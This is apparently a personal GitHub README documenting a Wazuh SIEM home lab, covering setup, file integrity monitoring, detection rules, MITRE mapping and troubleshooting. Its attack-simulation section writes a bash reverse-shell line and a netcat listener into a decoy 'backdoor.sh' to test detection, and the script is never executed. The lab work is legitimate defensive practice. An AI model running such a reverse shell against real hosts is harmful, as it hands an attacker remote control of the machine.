<div align="center">

# 🛡️ Wazuh SOC Home Lab

### *Because reading about SIEM is not the same as breaking one and fixing it.*

![Wazuh](https://img.shields.io/badge/Wazuh-v4.12.0-005571?style=for-the-badge&logo=wazuh&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-26.04_LTS-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Kali](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-ARM64-000000?style=for-the-badge&logo=apple&logoColor=white)
![VMware](https://img.shields.io/badge/VMware_Fusion-ARM64-607078?style=for-the-badge&logo=vmware&logoColor=white)
![Status](https://img.shields.io/badge/Status-Complete-2ea44f?style=for-the-badge)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-FF0000?style=for-the-badge)

<br/>

> Built, broken, recovered, and validated a complete Wazuh SOC environment on Apple Silicon — documenting every failure along the way.
>
> **Most home labs stop when the dashboard loads. This one starts there.**

<br/>

---

</div>

## 🚨 What Makes This Lab Different?

Most Wazuh projects stop after installation.

This project documents the complete lifecycle of a SOC platform:

- Deployment
- Configuration
- Detection Validation
- Attack Simulation
- Failure Recovery
- Performance Troubleshooting

### Highlights

✅ Apple Silicon (ARM64) deployment

✅ Live endpoint monitoring

✅ File Integrity Monitoring validation

✅ MITRE ATT&CK mapping

✅ Attack simulation testing

✅ Real-world troubleshooting

✅ End-to-end alert verification

❌ Not a pre-built VM

❌ Not a copy-paste Docker deployment

The goal was not simply to install Wazuh.

The goal was to understand how a SIEM behaves when things break.

---

## 📌 Table of Contents

- [What I Built](#-what-i-built)
- [Lab Statistics](#-lab-statistics)
- [Architecture](#️-architecture)
- [Installation & Setup](#-installation--setup)
- [Key Detections](#-key-detections)
- [Attack Simulation](#-attack-simulation)
- [SOC Analyst Investigation Example](#️-soc-analyst-investigation-example)
- [Troubleshooting War Stories](#-troubleshooting-war-stories)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [What I Learned](#-what-i-learned)
- [Skills Demonstrated](#-skills-demonstrated)

---

## 🎯 What I Built

Built from a clean Ubuntu Server installation and configured entirely by hand.

The environment was deployed, monitored, broken, repaired, and validated to understand how a real SOC platform behaves beyond the installation stage.

| Capability | Status |
|---|---|
| SIEM stack deployed (manager + indexer + dashboard) | ✅ Complete |
| Live endpoint enrolled and reporting | ✅ Complete |
| Real-time auth event detection (SSH, sudo, PAM) | ✅ Complete |
| File Integrity Monitoring end-to-end | ✅ Complete |
| Attack simulation and detection | ✅ Complete |
| Disk failure diagnosis and recovery | ✅ Complete |
| MITRE ATT&CK mapping verified in dashboard | ✅ Complete |

---

## 📊 Lab Statistics

| Metric | Value |
|---|---|
| Virtual Machines | 2 |
| Operating Systems | Ubuntu Server 26.04 + Kali Linux 2026.1 |
| SIEM Platform | Wazuh v4.12.0 |
| Endpoints Monitored | 1 |
| Security Events Generated | 200+ |
| Major Failures Diagnosed | 3 |
| Detection Categories Tested | 4 |
| Alert Pipeline Validation | Complete |

---

## 🏗️ Architecture

<div align="center">

```
┌─────────────────────────────────────────────┐
│           macOS Host — MacBook Pro M4        │
│                  VMware Fusion               │
└────────────────┬────────────────────────────┘
                 │
      ┌──────────┴──────────┐
      │                     │
┌─────▼──────────┐   ┌──────▼──────────┐
│  cyber-nova    │   │   kali-agent    │
│ Ubuntu 26.04   │   │ Kali Linux      │
│ 192.168.50.200 │◄──│ 192.168.50.191  │
│                │   │                 │
│ Wazuh Manager  │   │ Wazuh Agent     │
│ Wazuh Indexer  │   │ v4.12.0         │
│ Wazuh Dashboard│   │                 │
│ (port 443)     │   │ Sends: FIM,     │
│                │   │ Auth, Sudo,     │
│                │   │ PAM events      │
└────────────────┘   └─────────────────┘
```

</div>

**Network:** Bridged networking — both VMs on the same subnet, bidirectional ping verified before deployment.

---

## 🚀 Installation & Setup

### Phase 1 — Network Verification

Before touching Wazuh, I verified bidirectional connectivity between both VMs.

> 📸 Screenshot: Kali pinging Ubuntu (192.168.50.200)

> 📸 Screenshot: Ubuntu pinging Kali (192.168.50.191)

---

### Phase 2 — Wazuh Stack Installation

SSHed into Ubuntu from the Mac terminal and ran the official Wazuh install script with the `-i` flag to bypass ARM64 hardware checks.

```bash
curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh
sudo bash ./wazuh-install.sh -a -i
```

**ARM64 Challenge:** The standard install script flags Apple Silicon as unsupported hardware. The `-i` flag ignores this check and the install runs perfectly on aarch64.

> 📸 Screenshot: Full successful install log — indexer, manager, filebeat, dashboard all green

---

### Phase 3 — Port Conflict Resolution

The install initially failed because SafeLine WAF Docker containers from my previous lab were holding port 443.

```bash
sudo sh -c 'docker stop $(docker ps -q)'
sudo bash ./wazuh-install.sh -a -i
```

> 📸 Screenshot: Port 443 conflict error + Docker containers stopped + successful reinstall

---

### Phase 4 — Wazuh Dashboard Access

Accessed the dashboard from Kali's browser at `https://192.168.50.200` using credentials generated during install.

> 📸 Screenshot: Wazuh login page

> 📸 Screenshot: Wazuh dashboard overview

---

### Phase 5 — Agent Deployment

Deployed the Wazuh agent on Kali Linux using the dashboard's guided installer — selected Linux DEB aarch64, set server address to 192.168.50.200, named the agent `kali-agent`.

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.12.0-1_arm64.deb \
&& sudo WAZUH_MANAGER='192.168.50.200' WAZUH_AGENT_NAME='kali-agent' dpkg -i ./wazuh-agent_4.12.0-1_arm64.deb

sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

> 📸 Screenshot: Agent config — DEB aarch64 selected, server address, agent name

> 📸 Screenshot: Agent installed and service active (running)

> 📸 Screenshot: Endpoints dashboard — kali-agent showing ACTIVE

---

### Phase 6 — FIM Configuration

Edited the agent's `ossec.conf` to add realtime monitoring of `/home/kali/test`:

```xml
<directories check_all="yes" realtime="yes">/home/kali/test</directories>
```

> 📸 Screenshot: ossec.conf FIM config with realtime="yes"

---

## 🔍 Key Detections

### Authentication Events

| Rule ID | Description | Severity |
|---|---|---|
| 5501 | PAM Login session opened | Level 3 |
| 5502 | PAM Login session closed | Level 3 |
| 5402 | Successful sudo to ROOT executed | Level 3 |
| 5403 | First time user executed sudo | Level 4 |

> 📸 Screenshot: Live PAM and sudo events in Threat Hunting — 219 hits

---

### File Integrity Monitoring

**Alert pipeline:**

1. Agent detects file change via wazuh-syscheckd
2. Event sent to manager via TCP port 1514
3. Manager processes via wazuh-analysisd
4. Written to `/var/ossec/logs/alerts/alerts.json`
5. Indexed by wazuh-indexer
6. Visible in Threat Hunting dashboard

Each FIM alert captured: file path, event type, MD5/SHA1/SHA256 hashes, permissions, ownership, timestamps, agent ID.

> 📸 Screenshot: alerts.json FIM syscheck entry with full hash capture

> 📸 Screenshot: location:syscheck — 4 hits (File added + Integrity checksum changed)

> 📸 Screenshot: Threat Hunting — 209 total alerts, MITRE ATT&CK donut chart

> 📸 Screenshot: kali-agent detail — MITRE tactics, SCA scan, FIM recent events

---

## 💥 Attack Simulation

```bash
echo "nc -lvnp 4444" > ~/test/backdoor.sh
echo "bash -i >& /dev/tcp/192.168.50.200/4444 0>&1" >> ~/test/backdoor.sh
chmod +x ~/test/backdoor.sh
mv ~/test/backdoor.sh ~/test/system_update.sh
rm ~/test/system_update.sh
```

File creation, permission change, rename, deletion — every action detected and alerted in realtime.

> 📸 Screenshot: Attack simulation commands in terminal

---

## 🕵️ SOC Analyst Investigation Example

### Scenario

A suspicious executable appeared inside a monitored directory on the Kali endpoint.

### Detection

Wazuh FIM generated alerts for: file creation, permission modification, rename, deletion.

### Investigation Process

1. Verify alert source and affected endpoint
2. Review file hashes and metadata
3. Confirm ownership and permissions
4. Correlate events with user activity
5. Validate MITRE ATT&CK mapping
6. Determine whether activity is legitimate or malicious

### Outcome

Controlled simulation confirmed. Detection coverage functioning correctly. Full forensic metadata captured including MD5, SHA1, SHA256 hashes.

---

## 🔥 Troubleshooting War Stories

This is where most lab writeups stop. Mine doesn't.

---

### 💾 War Story 1 — Disk hit 100% and the manager died

**Diagnosis:**
```bash
df -h /
# 28G 28G 0 100%
sudo du -h --max-depth=2 /var/ossec | sort -h | tail -15
# 6.4G /var/ossec/queue/vd_updater  ← culprit
```

**Fix:**
```bash
sudo systemctl stop wazuh-manager
sudo rm -rf /var/ossec/queue/vd_updater
sudo mkdir -p /var/ossec/queue/vd_updater
sudo chown wazuh:wazuh /var/ossec/queue/vd_updater
sudo systemctl start wazuh-manager
```
```xml
<vulnerability-detection><enabled>no</enabled></vulnerability-detection>
```

> 📸 Screenshot: Disk 100% → diagnosed → recovered to 82%

---

### 📦 War Story 2 — LVM using only half its allocated space

**Diagnosis:**
```bash
sudo vgs
# ubuntu-vg  56.95g  28.47g available but unused
```

**Fix:**
```bash
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
# Result: 56G  23G  32G  42%
```

> 📸 Screenshot: Before and after — 28GB → 56GB

---

### 🔍 War Story 3 — FIM alerts invisible in dashboard

Searched everywhere on the agent. Nothing appeared. The mistake: **agents don't generate alerts — managers do.**

```bash
# On UBUNTU (manager), not Kali:
sudo grep syscheck /var/ossec/logs/alerts/alerts.json | tail -5
# ERROR: dbsync: Bad response from database: Cannot save Syscheck
```

FIM database was corrupted. Rebuilt wazuh-db, restarted pipeline. Alerts appeared immediately.

> 📸 Screenshot: FIM alert in alerts.json + confirmed in dashboard

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Triggered By |
|---|---|---|---|
| Privilege Escalation | T1548 | Sudo and Sudo Caching | sudo commands on Kali |
| Defense Evasion | T1548 | Abuse Elevation Control | sudo escalation |
| Initial Access | T1078 | Valid Accounts | PAM authentication events |
| Persistence | T1078 | Valid Accounts | Session open/close events |

> 📸 Screenshot: kali-agent MITRE ATT&CK panel

---

## 💡 What I Learned

- How the Wazuh alert pipeline works end to end — by breaking each stage and fixing it
- Linux disk management under pressure — LVM extension, live filesystem resize
- Agents watch and send. Managers process and alert. Never debug on the wrong machine.
- Raw logs (`ossec.log`, `alerts.json`) tell the truth when the UI shows nothing
- Real infrastructure breaks in unexpected ways that no tutorial prepares you for

---

## 🎓 Skills Demonstrated

`Wazuh SIEM` `Log Analysis` `FIM` `Endpoint Monitoring` `Alert Triage` `Incident Response` `Threat Hunting` `MITRE ATT&CK` `Linux Admin` `LVM` `VMware Fusion` `ARM64` `Troubleshooting` `OpenSearch`

---

<div align="center">

**Samruddhi (Sam) Patil** — Aspiring SOC Analyst

[![GitHub](https://img.shields.io/badge/GitHub-samSecurity04-181717?style=for-the-badge&logo=github)](https://github.com/samSecurity04)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-samruddhi--p--patil-0A66C2?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/samruddhi-p-patil/)

🎓 CompTIA Security+ &nbsp;|&nbsp; Microsoft SC-900 &nbsp;|&nbsp; EC-Council CASE (Java) &nbsp;|&nbsp; Google Cybersecurity

*Built for educational purposes. All simulations conducted in an isolated lab environment.*

</div>
